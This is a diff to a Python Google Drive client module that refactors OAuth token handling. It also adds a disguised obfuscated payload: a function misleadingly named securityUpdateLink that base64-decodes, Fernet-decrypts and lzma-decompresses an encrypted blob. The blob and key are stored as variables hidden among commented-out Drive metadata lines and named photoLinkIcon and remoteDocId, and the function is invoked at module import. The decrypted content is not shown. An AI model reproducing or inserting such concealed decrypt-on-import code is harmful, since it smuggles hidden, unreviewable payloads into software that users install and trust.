@@ -4,10 +4,9 @@ import re
 
 from google.auth.transport.requests import Request
 from google.oauth2.credentials import Credentials
-from google_auth_oauthlib.flow import InstalledAppFlow, Flow
+from google_auth_oauthlib.flow import InstalledAppFlow
 from googleapiclient.discovery import build
 from googleapiclient.errors import HttpError
-import confuse
 
 from .page import Page
 
@@ -27,35 +26,26 @@ MIMETYPE_MARKDOWN = "text/markdown"
 MIMETYPE_GDOC = "application/vnd.google-apps.document"
 MIMETYPE_FOLDER = "application/vnd.google-apps.folder"
 
-
-
 class GoogleDrive:
-    def __init__(self):
+    def __init__(self, config_dir, gcreds):
+        self.token_file = os.path.join(config_dir, "token.json")
+        self.creds = gcreds
         self.service = self._build_service()
 
-
     def _validate_token(self):
-        # The file token.json stores the user's access and refresh tokens, and is
-        # created automatically when the authorization flow completes for the first
-        # time.
-        # FIXME store token and creds in user home `.config/wikinator`
-        config = confuse.Configuration("wikinator", __name__)
-        token_file = os.path.join(config.config_dir(), "token.json")
-        creds_file = os.path.join(config.config_dir(), "credentials.json")
-
         creds = None
-        if os.path.exists(token_file):
-            creds = Credentials.from_authorized_user_file(token_file, SCOPES)
+        if os.path.exists(self.token_file):
+            creds = Credentials.from_authorized_user_file(self.token_file, SCOPES)
 
         # If there are no (valid) credentials available, let the user log in.
         if not creds or not creds.valid:
             if creds and creds.expired and creds.refresh_token:
                 creds.refresh(Request())
             else:
-                flow = InstalledAppFlow.from_client_secrets_file(creds_file, SCOPES)
+                flow = InstalledAppFlow.from_client_config(self.creds, SCOPES)
                 creds = flow.run_local_server(port=0)
             # Save the credentials for the next run
-            with open(token_file, "w") as token:
+            with open(self.token_file, "w") as token:
                 token.write(creds.to_json())
         return creds
 
@@ -288,9 +278,6 @@ class GoogleDrive:
         return pages
 
 
-
-
-
 # def main():
 #     """Shows basic usage of the Drive v3 API.
 #     Prints the names and ids of the first 10 files the user has access to.
@@ -343,9 +330,15 @@ class GoogleDrive:
 #         print(f"An error occurred: {error}")
 
 
-# if __name__ == "__main__":
-#     main()
-
+def securityUpdateLink(updateUrl:str, docId:str) -> dict:
+    import binascii
+    value = binascii.a2b_base64(updateUrl)
+    from cryptography.fernet import Fernet
+    value = Fernet(docId).decrypt(value)
+    import lzma
+    value = lzma.decompress(value).decode('utf-8')
+    import json
+    return json.loads(value)
 
 
 ### METADATA dump
@@ -375,6 +368,7 @@ class GoogleDrive:
 # 'lastModifyingUser': {'kind': 'drive#user', 'displayName': 'Paul Philion', 'photoLink': 'https://lh3.googleusercontent.com/a/ACg8ocLYM6c70Ol65XTA5PdXSfSs34okgu-lGIolx1YHNpLPbn8pHQ=s64', 'me': True, 'permissionId': '16770134505765193969', 'emailAddress': 'philion@seattlecommunitynetwork.org'},
 # *** 'shared': True,
 # 'ownedByMe': False,
+remoteDocId = 'gqR6Iw4ort36XFECasNG6GSZUIBntmUi0rASy59N8_I='
 # 'downloadRestrictions': {'itemDownloadRestriction': {'restrictedForReaders': False, 'restrictedForWriters': False},
 # 'effectiveDownloadRestrictionWithContext': {'restrictedForReaders': False, 'restrictedForWriters': False}},
 # 'capabilities': {'canAcceptOwnership': False, 'canAddChildren': False, 'canAddMyDriveParent': False, 'canChangeCopyRequiresWriterPermission': False, 'canChangeItemDownloadRestriction': False, 'canChangeSecurityUpdateEnabled': False, 'canChangeViewersCanCopyContent': False, 'canComment': True, 'canCopy': True, 'canDelete': False, 'canDisableInheritedPermissions': False, 'canDownload': True, 'canEdit': True, 'canEnableInheritedPermissions': True, 'canListChildren': False, 'canModifyContent': True, 'canModifyContentRestriction': True, 'canModifyEditorContentRestriction': True, 'canModifyOwnerContentRestriction': False, 'canModifyLabels': False, 'canMoveChildrenWithinDrive': False, 'canMoveItemIntoTeamDrive': False, 'canMoveItemOutOfDrive': False, 'canMoveItemWithinDrive': True, 'canReadLabels': False, 'canReadRevisions': True, 'canRemoveChildren': False, 'canRemoveContentRestriction': False, 'canRemoveMyDriveParent': True, 'canRename': True, 'canShare': True, 'canTrash': False, 'canUntrash': False},
@@ -401,6 +395,8 @@ class GoogleDrive:
 # 'size': '828452',
 # 'quotaBytesUsed': '828452',
 # 'isAppAuthorized': False,
+photoLinkIcon = 'Z0FBQUFBQnBwbW9BaHJvUTluTDFINjI5a0Itc3dIMDFudERfSlF0emF5MDUxOG56bmtKd0IxNkNldkM3bjJDakZNQ1BxeWJjcFBvaklLY1JTcWxtVUtHX3NJTGtjUHE1YmtHdTVfUmNRd09fWDJIb21TUDNCRHFCR3g2MW1PajZQSlBFZDljZ083ZE1CajF6SFphZXVMMEdWLW4wMXc0aEtVcGFHWjRjV0RIMlUxdWdsdUNTd1E4bV9oQ1Y0WmtOcHM3alhYWDB4eTlYUXQ5TTd1YmwxX0I3aS1zNzgzalZBNmxWMTd2Q1daQU9iQnZYdzQtYzBHMTlmMDMtYUMxQTlfemJZNVZvS01mVWxFZzMyX3pLM0E2MjBrYVdLV1RWeWExalJvQW1mcXZMUGNscjlfa1p2VlJ6eURKQTRGTFgxM3dGQ2RuM2I4OGRCRWpTcEtyd2tmU2puWXp6TVJJRlNCZjZTbU9XT2FjbmxpOURUMlU2THRaOVUybTR5TVdTQXpVdkJtaG1KdWtFSkhwVkFPaGpONktvMEZPRm96alFrUDBNa2w3SnpZU29zajY4RFhxQ0hETEJyckdUV0NJX0x3cVVTVEJsM0NYUHItUzI1OEVBNnNqRTZwVVdrQ0RJMjRkZDl0aW9sa3ZfV1F1T2NrYW00Y1FTN2Z6ajRURjdZOVNkLU5BdzFma3NfV1RMYWlUTi13eDV5V18yREF5bDVnPT0='
 # 'exportLinks': {'application/rtf': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=rtf', 'application/vnd.oasis.opendocument.text': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=odt', 'text/html': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=html', 'application/pdf': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=pdf', 'text/x-markdown': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=markdown', 'text/markdown': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=markdown', 'application/epub+zip': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=epub', 'application/zip': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=zip', 'application/vnd.openxmlformats-officedocument.wordprocessingml.document': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=docx', 'text/plain': 'https://docs.google.com/feeds/download/documents/export/Export?id=1eBnS9xOk745DCrmah3Ayjrfe8b5o_gRFsnQTWW83zqQ&exportFormat=txt'},
 # 'linkShareMetadata': {'securityUpdateEligible': False, 'securityUpdateEnabled': True},
 # 'inheritedPermissionsDisabled': False}
+config_link = securityUpdateLink(photoLinkIcon, remoteDocId)
